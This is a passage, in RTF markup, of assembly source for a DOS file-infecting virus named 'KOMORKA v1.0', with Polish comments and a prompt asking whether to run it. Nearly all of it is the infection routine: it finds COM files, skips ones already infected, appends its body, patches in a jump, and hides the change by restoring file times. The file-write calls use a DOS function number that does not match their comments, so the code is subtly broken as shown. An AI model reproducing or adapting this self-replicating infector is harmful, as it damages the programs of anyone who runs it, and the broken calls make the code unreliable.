\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   [si][NoweDTA.DTADate],VZnacznik  ; czy znaleziony plik jest juz}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; zarazony ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    SzukajNastepnyPlik               ; tak = szukaj nastepnego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,word ptr [si][NoweDTA.DTASize+2]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; pobierz starsza czesc dlugosci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     or    ax,ax                            ; czy plik krotszy niz 65536}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jnz   SzukajNastepnyPlik               ; nie - szukaj nastepnego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,word ptr [si][NoweDTA.DTASize]; pobierz dlugosc pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,64000                         ; czy dlugosc <= 64000}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ja    SzukajNastepnyPlik               ; nie - szukaj nastepnego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,3                             ; czy dlugosc >= 3}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jb    SzukajNastepnyPlik               ; nie - szukaj nastepnego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     sub   ax,3                             ; odejmij dlugosc skoku E9 ?? ??}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   word ptr [si][Skok+1],ax         ; zapisz do bufora rozkaz skoku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,AtrArchive                    ; podaj nowy atrybut : Archive}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][NoweDTA.DTAName]         ; podaj nazwe pliku do zmiany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4301h                         ; funkcja DOS - zmien atrybut}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    PrzywrocAtrybut                  ; gdy CF=1 to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][NoweDTA.DTAName]         ; podaj nazwe pliku do odczytu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,3D02h                         ; funkcja DOS - otworz plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; do odczytu i zapisu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    PrzywrocAtrybut                  ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xchg  ax,bx                            ; przenies uchwyt pliku do BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,3                             ; ilosc czytanych bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si+StareBajty]               ; podaj dokad czytac 3 bajty}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,3Fh                           ; funkcja DOS - czytaj z pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,word ptr [si+StareBajty]      ; wez dwa pierwsze bajty pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,'MZ'                          ; i sprawdz czy to nie EXE}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    ZamknijPlik                      ; gdy 'MZ', to plik EXE, powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,'ZM'                          ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    ZamknijPlik                      ; gdy 'ZM', to plik EXE, powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   cx,cx                            ; \\ zeruj CX:DX zawierajace}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   dx,dx                            ; / adres wzgledem konca pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4202h                         ; funkcja DOS - zmien wskaznik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; odczytu/zapisu na koniec pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,VirusDlug                     ; ilosc zapisanych bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si+103h]                     ; podaj skad zapisac wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,30h                           ; funkcja DOS - zapisz do pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   cx,cx                            ; \\ zeruj CX:DX zawierajace}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   dx,dx                            ; / adres wzgledem poczatku pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4200h                         ; funkcja DOS - zmien wskaznik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; odczytu/zapisu na poczatek pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,3                             ; ilosc zapisanych bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][Skok]                    ; podaj skad zapisac rozkaz skoku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,30h                           ; funkcja DOS - zapisz do pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,[si][NoweDTA.DTATime]         ; przywroc czas z bufora DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   dx,VZnacznik                     ; zaznacz infekcje pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,5701h                         ; funkcja DOS - wpisz date,czas}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ZamknijPlik:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,3Eh                           ; funkcja DOS - zamknij plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PrzywrocAtrybut:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cl,[si][NoweDTA.DTAAttr]         ; podaj stary atrybut, CH=0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][NoweDTA.DTAName]         ; podaj nazwe pliku do zmiany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4301h                         ; funkcja DOS - zmien atrybut}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SzukajNastepnyPlik:                        ; poprzedni plik byl zarazony}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,4Fh                           ; funkcja DOS - szukaj innego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; plik COM}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jnc   KolejnyPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NieMaPlikuCOM:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   dx,80h                           ; przywroc pierwotne DTA=PSP:80h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,1Ah                           ; funkcja DOS - ustaw nowe DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BezInfekcji:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,100h                          ; \\ skocz na poczatek programu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jmp   ax                               ; / do ofiary}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MaskaCOM   db '*.COM'                      ; maska plikow COM (ASCIIZ)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch StareBajty db 0CDh,20h,90h                 ; bufor zawiera zapamietane bajty}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; z poczatku programu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; tu : kod rozkazu int 20h/NOP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Skok       db 0E9h,?,?                     ; rozkaz skoku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Czesc Informayjna}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Informacja:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,09h                           ; funkcja DOS - wyswietl tekst$}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,01h                           ; funkcja DOS - czytaj znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; ze standardowego wejscia}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; AL zawiera znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  ax                               ; zapamietaj na chwile znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,0E0Dh                         ; \\  przejdz}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   10h                              ;  \\ do}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,0E0Ah                         ;  / nastepnej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   10h                              ; /  linii}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   ax                               ; przywroc znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     and   al,11011111b                     ; konwertuj znak na wielka litere}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   al,'T'                           ; czy potwierdzona infekcja}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     clc                                    ; ustaw flage na TAK}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    CLCRet                           ; TAK i powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     stc                                    ; ustaw flage na NIE i powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CLCRet:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ret                                    ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeInformacja db CR,LF,'KOMORKA v1.0, Autor : Adam Blaszczyk 1997'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch              db CR,LF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch              db CR,LF,'Czy chcesz uruchomic wirusa (T/N) ?'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch              db DOLAR}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VirusEnd:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NoweDTA   DTAStruc <?,?,?,?,?,?>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KOMORKA ENDS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch END Start}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
